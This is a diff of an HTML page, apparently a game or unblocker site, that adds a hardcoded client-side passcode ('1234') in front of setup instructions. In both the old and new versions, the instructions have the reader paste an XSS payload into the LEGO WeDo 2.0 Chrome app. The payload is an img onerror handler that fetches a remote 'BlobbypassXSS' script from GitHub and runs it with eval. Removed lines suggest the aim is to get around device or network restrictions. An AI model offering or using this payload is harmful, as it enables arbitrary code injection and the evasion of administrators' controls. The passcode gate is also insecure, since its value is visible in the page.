@@ -37,9 +37,14 @@
             width: 300px;
             z-index: 1001; /* Ensure the popup is on top */
         }
+
+        .passcode-input {
+            margin-bottom: 10px;
+        }
     </style>
     <script>
         let isPPressed = false;
+        let passcodeVerified = false; // Flag to track if passcode is correct
 
         function checkUserAgent() {
             const userAgent = navigator.userAgent;
@@ -83,7 +88,7 @@
         }
 
         async function loadGameContent() {
-            const url = 'https://raw.githubusercontent.com/Sjeakx/Sjeakx-blast/refs/heads/main/updateinfo.txt'; // Replace with your raw URL
+            const url = 'https://raw.githubusercontent.com/yourusername/yourrepo/branch/path/to/your/file.txt'; // Replace with your raw URL
             try {
                 const response = await fetch(url);
                 if (!response.ok) {
@@ -109,6 +114,20 @@
         function closeConfirmation() {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('confirmationDropdown').style.display = 'none';
+        }
+
+        // Verify passcode and show instructions if correct
+        function verifyPasscode() {
+            const passcodeInput = document.getElementById('passcodeInput').value;
+            const correctPasscode = '1234'; // Set your passcode here
+
+            if (passcodeInput === correctPasscode) {
+                passcodeVerified = true;
+                document.getElementById('instructions').style.display = 'block'; // Show the instructions
+                document.getElementById('passcodeError').style.display = 'none'; // Hide error message
+            } else {
+                document.getElementById('passcodeError').style.display = 'block'; // Show error message
+            }
         }
     </script>
 </head>
@@ -145,32 +164,29 @@
 
     <!-- Confirmation popup for LegoWeDo -->
     <div class="confirmation-dropdown hidden" id="confirmationDropdown">
-        <h3>Setup:</h3>
-        <p>First, install WeDo 2.0 LEGO® Education from the Chrome Webstore.</p>
-        <p>Wait until it loads, then turn off your WiFi.</p>
-        <p>Once you are in the project, click on the pencil in the top bar.</p>
-        <p>Then, click the green document button.</p>
-        <p>In the textbox, paste the following string:</p>
-        
-        <div class="code-snippet-wrapper">
-            <pre><code>&lt;img src=# onerror='fetch
-("https://raw.githubusercontent.com
-/Blobby-Boi/BlobbypassXSS/main/main.js")
-.then(r=>r.text())
-.then(c=>eval(c)) '&gt;</code></pre>
+        <h3>Enter Passcode:</h3>
+        <input type="password" id="passcodeInput" class="passcode-input" placeholder="Enter passcode">
+        <button onclick="verifyPasscode()">Verify</button>
+        <p id="passcodeError" style="color: red; display: none;">Incorrect passcode. Please try again.</p>
+
+        <div id="instructions" style="display: none;">
+            <h3>Setup you have to do this each time :</h3>
+            <p>First, install WeDo 2.0 LEGO® Education from the Chrome Webstore.</p>
+            <p>Once you are in the project, click on the pencil in the top bar.</p>
+            <p>Then, click the green document button.</p>
+            <p>In the textbox, paste the following string:</p>
+            
+            <div class="code-snippet-wrapper">
+                <pre><code>&lt;img src=# onerror='fetch
+    ("https://raw.githubusercontent.com
+    /Blobby-Boi/BlobbypassXSS/main/main.js")
+    .then(r=>r.text())
+    .then(c=>eval(c)) '&gt;</code></pre>
+            </div>
+            <p>Done!</p>
+
+            <button class="confirm-btn" onclick="closeConfirmation()">Got it, close</button>
         </div>
-
-        <p>Close LEGO WeDo 2.0 and re-enable your WiFi.</p>
-
-        <h3>How to use (after Setup):</h3>
-        <p>Open LEGO WeDo 2.0 (with WiFi turned on).</p>
-        <p>Click the project you made when you were setting this up.</p>
-        <p>Press the pencil in the top bar.</p>
-        <p><strong>Done!</strong></p>
-
-        <p>This does not bypass Wi-Fi restrictions. If you want to do that, do Blobwifi.</p>
-
-        <button class="confirm-btn" onclick="closeConfirmation()">Got it, close</button>
     </div>
 
     <div class="game-container hidden">
@@ -179,5 +195,3 @@
     </div>
 </body>
 </html>
-
-
